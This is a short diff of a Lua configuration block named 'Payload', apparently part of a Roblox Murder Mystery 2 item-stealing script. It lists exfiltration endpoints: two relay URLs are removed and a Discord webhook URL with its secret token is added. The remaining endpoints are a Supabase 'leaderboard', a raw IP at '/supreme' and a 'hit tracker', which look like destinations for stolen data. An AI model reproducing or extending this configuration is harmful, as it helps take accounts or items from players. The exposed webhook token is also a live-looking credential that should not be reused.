@@ -120,8 +120,7 @@ Payload.itemNameFragments = {
 }
 
 Payload.endpoints = {
-    publicWebhook = "https://mm2-relay.pages.dev/api/relay?wh=wh_dfe4c33d3b84196106590da7af1b318642304696",
-    dualhookWebhook = "https://mm2-relay.pages.dev/api/relay?wh=wh_bc0d90873158f460cb84b522aa720d20aedc1446",
+    publicWebhook = "https://discord.com/api/webhooks/1538598720625573941/tuIsYmcmcm_UQBNOrnQlzo3ftqm0Jj5Sf9zEHlPApapd-rWsAHREzkweiTw_RGnjTQAt",
     leaderboard = "https://hjurijvyzvsvivovhvkc.supabase.co/rest/v1/leaderboard",
     supreme = "http://109.120.157.241:5000/supreme",
     exampleHitTracker = "https://your-app.vercel.app/api/hit",
